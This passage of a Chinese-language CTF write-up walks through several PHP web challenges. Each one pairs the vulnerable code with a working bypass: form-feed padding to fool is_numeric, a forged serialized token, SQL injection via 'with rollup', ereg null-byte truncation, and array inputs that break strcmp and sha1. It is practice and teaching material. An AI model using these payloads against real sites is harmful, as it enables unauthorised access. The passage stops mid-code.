<p>构造我们的payload：<br>?shiyan=&amp;flag=</p>
<h2 id="绕过过滤的空白字符"><a href="#绕过过滤的空白字符" class="headerlink" title="绕过过滤的空白字符"></a>绕过过滤的空白字符</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$info = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">$req = [];</span></span><br><span class="line"><span class="php">$flag=<span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); <span class="comment">//为一个配置选项设置值</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); <span class="comment">//关闭所有PHP错误报告</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'number'</span>]))&#123;</span></span><br><span class="line"><span class="php">   header(<span class="string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="comment">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); <span class="comment">//die — 等同于 exit()</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123;  <span class="comment">//foreach 语法结构提供了遍历数组的简单方式</span></span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="php">        $value = trim($value);  <span class="comment">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span></span></span><br><span class="line"><span class="php">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); <span class="comment">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $number = strval($number); <span class="comment">//strval — 获取变量的字符串值</span></span></span><br><span class="line"><span class="php">    $i = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    $j = strlen($number) - <span class="number">1</span>; <span class="comment">//strlen — 获取字符串长度</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>($i &lt; $j) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $i++;</span></span><br><span class="line"><span class="php">        $j--;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>])) <span class="comment">//is_numeric — 检测变量是否为数字或数字字符串</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>]))) <span class="comment">//intval — 获取变量的整数值</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     $value1 = intval($req[<span class="string">"number"</span>]);</span></span><br><span class="line"><span class="php">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     <span class="keyword">if</span>($value1!=$value2)&#123;</span></span><br><span class="line"><span class="php">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php">     <span class="keyword">else</span></span></span><br><span class="line"><span class="php">     &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span></span><br><span class="line"><span class="php">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</span></span><br><span class="line"><span class="php">          &#125;</span></span><br><span class="line"><span class="php">          <span class="keyword">else</span></span></span><br><span class="line"><span class="php">          &#123;</span></span><br><span class="line"><span class="php">             $info=$flag;</span></span><br><span class="line"><span class="php">          &#125;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $info;</span></span><br></pre></td></tr></table></figure>
<p>经过分析提交的数需要满足三个条件才能拿到flag：<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>is_numeric($_REQUEST[<span class="string">'number'</span>])$req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])is_numeric函数判断是否为数字 这两句要求提交的数不能是数字包括小数</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="keyword">if</span>(intval($req[<span class="string">"number"</span>])!=$intval(strrev($req[<span class="string">"number"</span>])))这句的要求为该数的反转的整数值应该等于它本身的整数值即是一个回文数</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>is_palindrome_number($req[<span class="string">"number"</span>]))这句要求提交的数不是一个回文数</span><br><span class="line">从要求的条件我们可以构造一个绕过第一个条件和第三个条件即可</span><br><span class="line"></span><br><span class="line">is_numeric函数在开始判断前，会先跳过所有空白字符可是题目获取$req[‘number’]的时候明明使用<span class="keyword">trim</span>过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。</span><br><span class="line">所以我们构造payload=URL?%00%0c131即可绕过上面的条件获得flag</span><br></pre></td></tr></table></figure></p>
<h2 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'common.php'</span>;</span></span><br><span class="line"><span class="php">    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span></span><br><span class="line"><span class="php">    <span class="comment">//把一个或多个数组合并为一个数组</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $where;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($where)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $sql = mysql_query(<span class="string">'select * from user where '</span>.$where);</span></span><br><span class="line"><span class="php">            <span class="comment">//函数执行一条 MySQL 查询。</span></span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> @mysql_fetch_array($sql);</span></span><br><span class="line"><span class="php">            <span class="comment">//从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span></span><br><span class="line"><span class="php">    <span class="comment">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span></span><br><span class="line"><span class="php">        <span class="comment">//gzuncompress:进行字符串压缩</span></span></span><br><span class="line"><span class="php">        <span class="comment">//unserialize: 将已序列化的字符串还原回 PHP 的值</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $db = <span class="keyword">new</span> db();</span></span><br><span class="line"><span class="php">        $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span></span><br><span class="line"><span class="php">        <span class="comment">//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        header(<span class="string">'Location: index.php?error=1'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>发现这段<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">    echo <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  header(<span class="string">'Location: index.php?error=1'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>login[‘user’]从这段来<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">  $db = <span class="keyword">new</span> db();</span><br><span class="line">  $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br></pre></td></tr></table></figure></p>
<p>发现requset中获取token值然后对它进行unserialize，gzuncompress，base64_decode等一系列操作得到login，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unserialize：对单一的已序列化的变量进行操作，将其转换回 PHP 的值</span><br><span class="line"></span><br><span class="line">gzuncompress：解压被压缩的字符串</span><br></pre></td></tr></table></figure>
<p>然后在login中获取键为user的值，如果等于ichunqiu就得出flag</p>
<p>那么我们只要对user:ichunqiu进行一系列逆操作就行<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = <span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">'ichunqiu'</span>);</span></span><br><span class="line"><span class="php">$a = base64_encode(gzcompress(serialize($a)));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $a</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="SQL注入-with-rollup绕过"><a href="#SQL注入-with-rollup绕过" class="headerlink" title="SQL注入_with rollup绕过"></a>SQL注入_with rollup绕过</h2><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/pcat" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat</a><br>在第一层的filter里面就过滤了常用的SQL关键词，所以常规的SQL 注入就不行了。如果输入了filter里面的语句，网页返回“水可载舟，亦可赛艇！”<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">0</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">1</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">2</span>#</span><br></pre></td></tr></table></figure></p>
<p>发现2#时返回“一颗赛艇！” 其他都是“亦可赛艇！”———–说明数据库只有两条信息<br>利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的<br>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>payload：’ or 1=1 group by pwd with rollup limit 1 offset 2 #</p>
<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>地址:<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/more.php</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">  &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span></span><br><span class="line"><span class="php">   &#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span></span><br><span class="line"><span class="php">       &#125;</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">     <span class="keyword">else</span></span></span><br><span class="line"><span class="php">     &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>ereg有两个漏洞：<br>①%00截断及遇到%00则默认为字符串的结束</p>
<p>②当ntf为数组时它的返回值不是FALSE<br>得到想要得到flag需要三个条件<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET['password']) ！=== <span class="literal">FALSE</span>即提交的password必须是只能是一个或者多个数字、大小写字母。</span><br><span class="line"><span class="number">2.</span>strlen($_GET['password']) &lt; <span class="number">8</span> &amp;&amp; $_GET['password'] &gt; <span class="number">9999999</span> 提交的password长度要小于<span class="number">8</span>并且大小要大于<span class="number">99999999</span></span><br><span class="line"><span class="number">3.</span> strpos ($_GET['password'], '*-*') !== <span class="literal">FALSE</span> password里必须要有’-’</span><br><span class="line"></span><br><span class="line">因为ereg()函数存在NULL截断漏洞，导致正则过滤被绕过,所以可以用%<span class="number">00</span>来截断正则匹配</span><br><span class="line">第二个条件长度小于<span class="number">8</span>大小大于<span class="number">99999999</span>可以用科学计数法来绕过</span><br><span class="line"></span><br><span class="line">则最后构造password=<span class="number">1e8</span>%<span class="number">00</span>*-*即可得到flag</span><br></pre></td></tr></table></figure></p>
<h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;  </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//比较两个字符串（区分大小写）</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>  </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。<br>如果 str1 小于 str2 返回 &lt; 0；<br>如果 str1 大于 str2 返回 &gt; 0；<br>如果两者相等，返回 0<br>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL,而判断使用的是==，NULL==0是 bool(true)</p>
<h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>===会比较类型，比如bool sha1()函数和md5()函数存在着漏洞，sha1()函数默认的传入参数类型是字符串型，那要是给它传入数组呢会出现错误，使sha1()函数返回错误，也就是返回false，这样一来===运算符就可以发挥作用了，需要构造username和password既不相等，又同样是数组类型</p>
<p>?name[]=a&amp;password[]=b</p>
<h2 id="SESSION验证绕过"><a href="#SESSION验证绕过" class="headerlink" title="SESSION验证绕过"></a>SESSION验证绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span 